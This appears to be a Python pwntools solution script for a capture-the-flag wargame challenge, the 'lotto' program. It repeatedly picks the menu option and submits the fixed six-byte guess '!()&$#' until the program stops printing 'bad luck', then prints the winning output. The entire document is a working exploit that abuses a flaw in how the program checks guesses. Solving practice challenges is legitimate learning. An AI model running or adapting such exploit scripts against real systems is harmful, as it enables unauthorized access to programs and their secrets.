from pwn import *
import sys

p = process('/home/lotto/lotto')

while True:
    line = p.recv(1024)
    while 'Select' in line or '1. ' in line or '2. ' in line or  '3. ' in line:
        p.sendline('1')
        line = p.recv(1024)
    while '6 lotto' in line:
    	p.sendline('!()&$#')
        line = p.recv(1024)
    if b'bad luck' not in line and b'Lotto Start' not in line:
        print ''
        print line
        break
    else:
        sys.stdout.write('.')


